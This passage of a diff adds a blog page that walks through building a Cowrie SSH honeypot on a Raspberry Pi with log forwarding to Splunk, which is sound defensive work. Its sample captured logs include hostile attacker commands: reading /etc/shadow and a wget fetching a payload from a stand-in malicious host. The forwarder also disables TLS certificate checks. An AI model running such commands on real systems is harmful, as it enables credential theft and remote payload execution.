+      <pre><code class="language-bash">nmap -sn 10.0.0.0/24</code></pre>
+      <div class="alert-info mt-3">If the Pi appears on the network but SSH is connection-refused, it's still running firstrun.sh — wait 30 more seconds. Use <code>ssh karim@raspberrypi.local</code> if the IP is unstable during DHCP assignment.</div>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 03 — SYSTEM UPDATE</span>
+      <div class="step-title">Full OS upgrade before installing anything</div>
+      <div class="step-body">Never install software on an unpatched system. The fresh Trixie image had a kernel update pending — this was applied first.</div>
+      <pre><code class="language-bash">sudo apt update && sudo apt upgrade -y</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 04 — MOVE REAL SSH TO PORT 2222</span>
+      <div class="step-title">Vacate port 22 for Cowrie — keep admin access</div>
+      <div class="step-body">Edit <code>/etc/ssh/sshd_config</code>, change <code>#Port 22</code> to <code>Port 2222</code>, restart SSH. <strong>Critical:</strong> always test the new port from a second terminal before closing the original session. If the new port works, port 22 is now free for Cowrie.</div>
+      <pre><code class="language-bash">sudo nano /etc/ssh/sshd_config
+# Change: #Port 22  →  Port 2222
+sudo systemctl restart ssh
+
+# From a NEW terminal — verify before closing original:
+ssh -p 2222 karim@raspberrypi.local</code></pre>
+      <div class="alert-warning mt-3"><strong>Warning:</strong> The <code>/etc/ssh/sshd_config.d/</code> directory is included automatically and can override the port setting. Check for files there if the port change doesn't take effect.</div>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 05 — INSTALL DEPENDENCIES</span>
+      <div class="step-title">All packages Cowrie needs to build and run</div>
+      <div class="step-body">This includes <code>authbind</code> for binding privileged port 22 without root, build tools for compiling Python crypto extensions, and git to clone the Cowrie repository.</div>
+      <pre><code class="language-bash">sudo apt install -y git python3-venv python3-pip libssl-dev libffi-dev build-essential authbind</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 06 — CREATE COWRIE USER &amp; CONFIGURE AUTHBIND</span>
+      <div class="step-title">Principle of least privilege — Cowrie runs as its own user</div>
+      <div class="step-body">Never run honeypot software as root. A dedicated <code>cowrie</code> user with no login shell limits blast radius if the honeypot is exploited. <code>authbind</code> grants this user-level process permission to bind port 22 specifically.</div>
+      <pre><code class="language-bash">sudo adduser --disabled-password cowrie
+sudo touch /etc/authbind/byport/22
+sudo chown cowrie /etc/authbind/byport/22
+sudo chmod 770 /etc/authbind/byport/22</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 07 — CLONE COWRIE &amp; BUILD VIRTUAL ENVIRONMENT</span>
+      <div class="step-title">Isolated Python environment for all dependencies</div>
+      <div class="step-body">Switch to the cowrie user and clone the repository. A virtual environment keeps Cowrie's Python packages isolated from the system Python — critical for reproducibility and clean upgrades.</div>
+      <pre><code class="language-bash">sudo su - cowrie
+git clone https://github.com/cowrie/cowrie
+cd cowrie
+python3 -m venv cowrie-env
+source cowrie-env/bin/activate
+pip install --upgrade pip
+pip install -r requirements.txt</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 08 — INSTALL COWRIE AS A PACKAGE</span>
+      <div class="step-title">Cowrie v3 uses twistd — bin/cowrie no longer exists</div>
+      <div class="step-body">Cowrie v3.x ships as an installable Python package. Installing with <code>-e</code> (editable mode) registers the <code>cowrie</code> Twisted plugin so <code>twistd</code> can discover and run it. Without this step, twistd reports "Unknown command: cowrie".</div>
+      <pre><code class="language-bash">pip install -e .</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 09 — CONFIGURE COWRIE</span>
+      <div class="step-title">Fake hostname, JSON logging, listen on port 22</div>
+      <div class="step-body">The default config lives at <code>src/cowrie/data/etc/cowrie.cfg.dist</code> in v3 (not <code>etc/cowrie.cfg.dist</code> as older guides suggest). Three settings matter most: fake hostname for realism, listen port, and JSON log output.</div>
+      <pre><code class="language-bash">cp src/cowrie/data/etc/cowrie.cfg.dist etc/cowrie.cfg
+nano etc/cowrie.cfg</code></pre>
+      <pre><code class="language-ini">[honeypot]
+hostname = ubuntu-server          # convincing fake hostname
+listen_endpoints = tcp:22:interface=0.0.0.0
+
+[output_jsonlog]
+enabled = true</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 10 — LAUNCH &amp; TEST</span>
+      <div class="step-title">Start the honeypot and verify it's catching connections</div>
+      <div class="step-body">Start Cowrie using <code>authbind</code> to bind port 22. The <code>-n</code> flag prevents twistd from daemonizing (keeps it in foreground for debugging). Watch the log in real time as test connections arrive.</div>
+      <pre><code class="language-bash">authbind --deep twistd -n cowrie</code></pre>
+      <pre><code class="language-bash"># From Windows — connect to the honeypot
+ssh root@raspberrypi.local
+# Any password works — you land in a fake Debian shell
+# root@ubuntu-server:~#</code></pre>
+      <pre><code class="language-json">{"eventid":"cowrie.login.success","username":"root","password":"karim",
+ "message":"login attempt [root/karim] succeeded","src_ip":"10.0.0.141",
+ "timestamp":"2026-06-08T13:22:41.897262Z"}
+{"eventid":"cowrie.command.input","input":"whoami","src_ip":"10.0.0.141",
+ "timestamp":"2026-06-08T13:22:53.885627Z"}</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 11 — SYSTEMD SERVICE</span>
+      <div class="step-title">Auto-start on boot — survives reboots</div>
+      <div class="step-body">Create a systemd unit file for Cowrie. The service runs as the <code>cowrie</code> user with <code>authbind</code> granting port 22 access. <code>Restart=on-failure</code> ensures recovery from crashes.</div>
+      <pre><code class="language-bash">sudo nano /etc/systemd/system/cowrie.service</code></pre>
+      <pre><code class="language-ini">[Unit]
+Description=Cowrie SSH Honeypot
+After=network.target
+
+[Service]
+Type=simple
+User=cowrie
+WorkingDirectory=/home/cowrie/cowrie
+ExecStart=/usr/bin/authbind --deep /home/cowrie/cowrie/cowrie-env/bin/twistd -n cowrie
+Restart=on-failure
+RestartSec=30s
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+      <pre><code class="language-bash">sudo systemctl daemon-reload
+sudo systemctl enable cowrie
+sudo systemctl start cowrie
+sudo systemctl status cowrie   # Active: active (running)</code></pre>
+    </div>
+  </div>
+
+  <!-- 06. Splunk Integration -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">06.</span> Splunk HEC Integration</div>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1.25rem;">Since the Pi Zero 2 WH runs a 32-bit OS (<code>armv7l</code>) and Splunk's Universal Forwarder only ships for 64-bit platforms, a custom Python script handles the log forwarding. The script tails <code>cowrie.json</code> in real time and POSTs each new line to Splunk's HTTP Event Collector.</p>
+
+    <div class="step-card">
+      <span class="step-num">STEP 01 — ENABLE SPLUNK HEC</span>
+      <div class="step-title">Configure Splunk to receive events over HTTP</div>
+      <div class="step-body">In Splunk: <strong>Settings → Data Inputs → HTTP Event Collector → Global Settings</strong> — enable all tokens. Then create a new token named <code>cowrie</code> with source type <code>_json</code>, index <code>main</code>. Note: Splunk HEC uses <strong>HTTPS</strong> by default on port 8088 with a self-signed certificate.</div>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 02 — OPEN WINDOWS FIREWALL PORT 8088</span>
+      <div class="step-title">Allow inbound HEC connections from the Pi</div>
+      <div class="step-body">Windows Defender Firewall blocks port 8088 by default. Add an inbound rule in an elevated PowerShell session:</div>
+      <pre><code class="language-powershell">New-NetFirewallRule -DisplayName "Splunk HEC" -Direction Inbound -Protocol TCP -LocalPort 8088 -Action Allow</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 03 — DEPLOY THE FORWARDER SCRIPT</span>
+      <div class="step-title">Python script that tails cowrie.json and POSTs to HEC</div>
+      <div class="step-body">Written on Windows to avoid SSH terminal indentation issues, then SCP'd to the Pi. The script uses a custom SSL context to bypass self-signed certificate rejection.</div>
+      <pre><code class="language-python">import time, json, urllib.request, ssl
+
+COWRIE_LOG    = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
+SPLUNK_HEC_URL = "https://10.0.0.141:8088/services/collector/event"
+SPLUNK_TOKEN  = "&lt;your-hec-token&gt;"
+
+CTX = ssl.create_default_context()
+CTX.check_hostname = False
+CTX.verify_mode    = ssl.CERT_NONE
+
+def send_event(line):
+    event = {"event": json.loads(line), "sourcetype": "_json"}
+    req = urllib.request.Request(
+        SPLUNK_HEC_URL, data=json.dumps(event).encode(),
+        headers={"Authorization": "Splunk " + SPLUNK_TOKEN}
+    )
+    try:
+        urllib.request.urlopen(req, timeout=5, context=CTX)
+    except Exception as e:
+        print("HEC error:", e)
+
+def tail_forever(path):
+    with open(path) as f:
+        f.seek(0, 2)          # seek to end of file
+        while True:
+            line = f.readline()
+            if line: send_event(line.strip())
+            else: time.sleep(1)
+
+if __name__ == "__main__":
+    tail_forever(COWRIE_LOG)</code></pre>
+      <pre><code class="language-powershell"># Transfer from Windows to Pi:
+scp -P 2222 C:\Users\karim\cowrie_to_splunk.py karim@raspberrypi.local:/home/karim/
+</code></pre>
+      <pre><code class="language-bash"># Move to /opt and set up systemd service:
+sudo mv /home/karim/cowrie_to_splunk.py /opt/cowrie_to_splunk.py</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 04 — SYSTEMD SERVICE FOR FORWARDER</span>
+      <div class="step-title">Auto-start the HEC forwarder alongside Cowrie</div>
+      <div class="step-body">The forwarder runs as the <code>cowrie</code> user so it can read the log files owned by that user. The <code>After=cowrie.service</code> dependency ensures the honeypot starts first.</div>
+      <pre><code class="language-ini">[Unit]
+Description=Cowrie to Splunk HEC Forwarder
+After=network.target cowrie.service
+
+[Service]
+Type=simple
+User=cowrie
+ExecStart=/usr/bin/python3 /opt/cowrie_to_splunk.py
+Restart=on-failure
+RestartSec=10s
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+      <pre><code class="language-bash">sudo systemctl daemon-reload
+sudo systemctl enable cowrie-splunk
+sudo systemctl start cowrie-splunk</code></pre>
+    </div>
+  </div>
+
+  <!-- 07. Results -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">07.</span> What Cowrie Captures</div>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1.25rem;">Every SSH connection to port 22 produces a rich structured JSON event stream. Here is a representative sample from a single test session — this is exactly what real attackers will generate when they probe the honeypot from the internet.</p>
+
+    <div class="step-card">
+      <span class="step-num">EVENT TYPE — SESSION CONNECT</span>
+      <div class="step-title">Connection metadata logged immediately on contact</div>
+      <div class="step-body">Source IP, source port, destination, session ID, and protocol are captured the moment a connection is established — before any authentication attempt.</div>
+      <pre><code class="language-json">{
+  "eventid":  "cowrie.session.connect",
+  "src_ip":   "10.0.0.141",
+  "src_port": 23721,
+  "dst_ip":   "10.0.0.153",
+  "dst_port": 22,
+  "session":  "9ae329d4413d",
+  "protocol": "ssh",
+  "timestamp":"2026-06-08T13:22:39.545863Z"
+}</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">EVENT TYPE — CLIENT FINGERPRINT</span>
+      <div class="step-title">SSH client identified via HASSH fingerprint</div>
+      <div class="step-body">Cowrie extracts the SSH client's key exchange algorithms and computes a HASSH fingerprint — a hash of the client's SSH negotiation parameters. This fingerprints the tool being used (Metasploit, custom scanner, OpenSSH version, etc.) even when the operator changes their IP.</div>
+      <pre><code class="language-json">{
+  "eventid":  "cowrie.client.version",
+  "version":  "SSH-2.0-OpenSSH_for_Windows_9.5",
+  "hassh":    "701158e75b508e76f0410d5d22ef9df0",
+  "src_ip":   "10.0.0.141",
+  "session":  "9ae329d4413d"
+}</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">EVENT TYPE — CREDENTIAL CAPTURE</span>
+      <div class="step-title">Every username and password attempt logged in plaintext</div>
+      <div class="step-body">Cowrie accepts any credential combination by default. Every attempt — whether it succeeds or fails — is logged with the exact username and password. This builds a live credential spray database straight from real attack traffic.</div>
+      <pre><code class="language-json">{
+  "eventid":  "cowrie.login.success",
+  "username": "root",
+  "password": "admin123",
+  "src_ip":   "10.0.0.141",
+  "session":  "9ae329d4413d",
+  "timestamp":"2026-06-08T13:22:41.897262Z"
+}</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">EVENT TYPE — COMMAND LOGGING</span>
+      <div class="step-title">Every keystroke in the fake shell recorded</div>
+      <div class="step-body">Commands run inside the fake shell generate <code>cowrie.command.input</code> events. Failed commands (unknown to Cowrie's fake shell) generate <code>cowrie.command.failed</code>. Both are logged — failed commands reveal what the attacker expected to find.</div>
+      <pre><code class="language-json">{"eventid":"cowrie.command.input","input":"whoami","src_ip":"10.0.0.141"}
+{"eventid":"cowrie.command.input","input":"cat /etc/shadow","src_ip":"10.0.0.141"}
+{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"10.0.0.141"}
+{"eventid":"cowrie.command.input","input":"wget http://malicious.site/payload.sh","src_ip":"10.0.0.141"}
+{"eventid":"cowrie.command.failed","input":"ipconfig","src_ip":"10.0.0.141"}</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">EVENT TYPE — TTY RECORDING</span>
+      <div class="step-title">Full terminal session recorded for playback</div>
+      <div class="step-body">Cowrie records the complete terminal interaction as a TTY log file. The session can be replayed byte-for-byte to reconstruct exactly what the attacker saw and typed, including timing. Each recording is SHA256-hashed for integrity.</div>
+      <pre><code class="language-json">{
+  "eventid":  "cowrie.log.closed",
+  "ttylog":   "var/lib/cowrie/tty/087fdb158d77...",
+  "shasum":   "087fdb158d77adbc9b8d7f09e34e4e7e...",
+  "size":     602,
+  "duration": "22.6"
+}</code></pre>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">SPLUNK RESULT — 17 EVENTS IN ONE SESSION</span>
+      <div class="step-title">Full event pipeline confirmed working end-to-end</div>
+      <div class="step-body">A single test SSH session to the honeypot generated 17 structured JSON events in Splunk within seconds of the connection. The complete attack lifecycle is visible: connect → fingerprint → authenticate → enumerate → exit.</div>
+      <div class="alert-info mt-3">Splunk search: <code>index=main sourcetype=_json</code> — Events arrive with fields <code>src_ip</code>, <code>eventid</code>, <code>username</code>, <code>password</code>, <code>input</code>, <code>session</code>, <code>timestamp</code> all automatically parsed from the JSON structure.</div>
+    </div>
+  </div>
+
+  <!-- 08. Results -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">08.</span> Outcomes &amp; Security Value</div>
+    <ul class="bullet-list" style="margin-bottom:1.25rem;">
+      <li>Port 22 now runs a fully operational Cowrie SSH honeypot — any scanner probing the default SSH port hits a convincing fake Linux shell</li>
+      <li>Real SSH administration moved to port 2222, invisible to automated scanners that only target default ports</li>
+      <li>Every credential attempt logged in plaintext — username, password, and SSH client fingerprint (HASSH) recorded per session</li>
+      <li>Every command typed in the fake shell logged as a structured JSON event with timestamp and session correlation</li>
+      <li>Full TTY session recordings stored for forensic replay — every keypress, including timing, preserved</li>
+      <li>Live event stream flows into Splunk via HEC — 17 event types per session, all queryable in real time</li>
+      <li>Both <code>cowrie.service</code> and <code>cowrie-splunk.service</code> enabled and active — survive reboots automatically</li>
+      <li>Attacker IPs collected from <code>src_ip</code> field, ready to be fed into Pi-hole blocklist (next phase)</li>
+    </ul>
+    <div class="alert-warning">
+      <strong style="font-family:'Fira Code',monospace;font-size:0.7rem;letter-spacing:0.06em;">THREAT INTELLIGENCE LAYER —</strong>
+      The honeypot currently operates on the local network. The next phase exposes it to the internet (port-forwarding port 22 on the router) — at which point real botnet scanners and credential stuffers will begin probing within minutes. The same pipeline that handled the test session will automatically capture, log, and forward real attack data to Splunk.
+    </div>
+  </div>
+
+  <!-- 09. Future -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">09.</span> Roadmap &amp; Next Steps</div>
+    <ul class="bullet-list">
+      <li><strong style="color:var(--text-h)">Splunk Dashboard</strong> — build panels for top attacker IPs, most tried passwords, command frequency heatmap, attack volume over time, and SSH client fingerprint distribution</li>
+      <li><strong style="color:var(--text-h)">Pi-hole Auto-Blocklist</strong> — Python cron script extracts <code>src_ip</code> from <code>cowrie.json</code>, queries AbuseIPDB for reputation score, and adds confirmed malicious IPs to Pi-hole's blocklist automatically</li>
+      <li><strong style="color:var(--text-h)">GeoIP Enrichment</strong> — enrich Splunk events with attacker geolocation using MaxMind GeoLite2 — map attack origin countries in a Splunk geographic visualization</li>
+      <li><strong style="color:var(--text-h)">Internet Exposure</strong> — forward port 22 on the router to 10.0.0.153 — expose the honeypot to real internet attack traffic and collect genuine attacker TTPs</li>
+      <li><strong style="color:var(--text-h)">MITRE ATT&amp;CK Mapping</strong> — classify captured commands against MITRE ATT&amp;CK techniques (T1059 Command Execution, T1110 Brute Force, T1005 Data from Local System) and tag Splunk events accordingly</li>
+      <li><strong style="color:var(--text-h)">Fake File Honeytokens</strong> — plant fake AWS credentials and private keys in the Cowrie fake filesystem — trigger alerts when attackers attempt to read them</li>
+    </ul>
+  </div>
+
+  <div style="text-align:center;margin-top:2.5rem;">
+    <a href="Blog.html" class="btn-outline" id="back-btn">← Back to Blog</a>
+  </div>
+
+</main>
+
+<footer>
+  <p>Abdelkrim Zouaki · <a href="https://github.com/karim871" style="color:inherit;text-decoration:none;">karim871</a> · Montreal, QC</p>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/@studio-freight/lenis@1.0.42/dist/lenis.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ini.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script>
+const lenis = new Lenis({duration:1.2,easing:(t)=>Math.min(1,1.001-Math.pow(2,-10*t)),smooth:true,smoothWheel:false});
+lenis.on('scroll',ScrollTrigger.update);
+gsap.ticker.add((time)=>{lenis.raf(time*1000);});
+gsap.ticker.lagSmoothing(0);
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();lenis.scrollTo(a.getAttribute('href'));});});
+
+const progressBar=document.getElementById('progress-bar');
+window.addEventListener('scroll',()=>{const pct=window.scrollY/(document.documentElement.scrollHeight-window.innerHeight)*100;progressBar.style.width=Math.min(pct,100)+'%';},{passive:true});
+
+const dot=document.getElementById('cursor-dot');
+const ring=document.getElementById('cursor-ring');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',(e)=>{mx=e.clientX;my=e.clientY;});
+(function animCursor(){rx+=(mx-rx)*0.13;ry+=(my-ry)*0.13;dot.style.left=mx+'px';dot.style.top=my+'px';ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(animCursor);})();
+document.querySelectorAll('a,button,.metric-card,.step-card,.step-card-err,.glass').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{dot.style.transform='translate(-50%,-50%) scale(2.5)';ring.style.width='56px';ring.style.height='56px';ring.style.borderColor='rgba(255,255,255,0.9)';});
+  el.addEventListener('mouseleave',()=>{dot.style.transform='translate(-50%,-50%) scale(1)';ring.style.width='36px';ring.style.height='36px';ring.style.borderColor='rgba(255,255,255,0.5)';});
+});
+
+const tc=document.getElementById('cursor-canvas');
+const tctx=tc.getContext('2d');
+let pts=[];
+function resizeTC(){tc.width=window.innerWidth;tc.height=window.innerHeight;}
+resizeTC();window.addEventListener('resize',resizeTC);
+document.addEventListener('mousemove',(e)=>{pts.push({x:e.clientX,y:e.clientY,age:0,life:28+Math.random()*18});if(pts.length>70)pts.shift();});
+(function drawTrail(){tctx.clearRect(0,0,tc.width,tc.height);pts=pts.filter(p=>p.age<p.life);for(const p of pts){const a=(1-p.age/p.life)*0.55;const r=(1-p.age/p.life)*2.5;tctx.beginPath();tctx.arc(p.x,p.y,r,0,Math.PI*2);tctx.fillStyle=`rgba(255,255,255,${a})`;tctx.fill();p.age++;}requestAnimationFrame(drawTrail);})();
+
+gsap.registerPlugin(ScrollTrigger);
+
+function splitWords(el){const html=el.innerHTML;const words=html.trim().split(/\s+/);el.innerHTML=words.map(w=>`<span class="word-w"><span class="word-i">${w}</span></span>`).join(' ');}
+splitWords(document.getElementById('hl1'));
+splitWords(document.getElementById('hl2'));
+gsap.from('.word-i',{y:'115%',duration:1.1,ease:'power4.out',stagger:0.065,delay:0.1});
+gsap.from('.hero-eyebrow',{opacity:0,y:14,duration:0.9,ease:'power3.out',delay:0.05});
+gsap.from('.hero-tags',{opacity:0,y:10,duration:0.8,ease:'power3.out',delay:0.3});
+gsap.from('.hero-sub',{opacity:0,y:16,duration:0.9,ease:'power3.out',delay:0.65});
+gsap.from('.hero-meta',{opacity:0,y:10,duration:0.8,ease:'power3.out',delay:0.8});
+gsap.from('#hero-stat',{opacity:0,x:40,duration:1.0,ease:'power3.out',delay:0.9});
+
+gsap.to('.hero-inner',{y:90,ease:'none',scrollTrigger:{trigger:'#hero',start:'top top',end:'bottom top',scrub:1.2}});
+gsap.to('.hero-inner',{opacity:0,ease:'none',scrollTrigger:{trigger:'#hero',start:'45% top',end:'bottom top',scrub:1}});
+gsap.to('#hero-stat',{opacity:0,y:-50,ease:'none',scrollTrigger:{trigger:'#hero',start:'40% top',end:'bottom top',scrub:1}});
+
+gsap.from('.metric-card',{y:30,opacity:0,duration:0.7,ease:'power3.out',stagger:0.1,scrollTrigger:{trigger:'#metrics',start:'top 88%',once:true}});
+gsap.utils.toArray('.glass').forEach(el=>{gsap.from(el,{y:36,opacity:0,duration:0.8,ease:'power3.out',scrollTrigger:{trigger:el,start:'top 90%',once:true}});});
+gsap.from('.pull-quote',{x:-20,opacity:0,duration:0.9,ease:'power3.out',scrollTrigger:{trigger:'.pull-quote',start:'top 88%',once:true}});
+gsap.utils.toArray('.step-card,.step-card-err').forEach(card=>{gsap.from(card,{y:24,opacity:0,duration:0.65,ease:'power3.out',scrollTrigger:{trigger:card,start:'top 92%',once:true}});});
+gsap.utils.toArray('.bullet-list li').forEach(li=>{gsap.from(li,{x:-14,opacity:0,duration:0.5,ease:'power3.out',scrollTrigger:{trigger:li,start:'top 93%',once:true}});});
+
+document.querySelectorAll('.btn-outline').forEach(btn=>{
+  btn.addEventListener('mousemove',(e)=>{const r=btn.getBoundingClientRect();const x=(e.clientX-r.left-r.width/2)*0.28;const y=(e.clientY-r.top-r.height/2)*0.28;gsap.to(btn,{x,y,duration:0.35,ease:'power2.out'});});
+  btn.addEventListener('mouseleave',()=>{gsap.to(btn,{x:0,y:0,duration:0.6,ease:'elastic.out(1,0.5)'});});
+});
+</script>
+</body>
+</html>
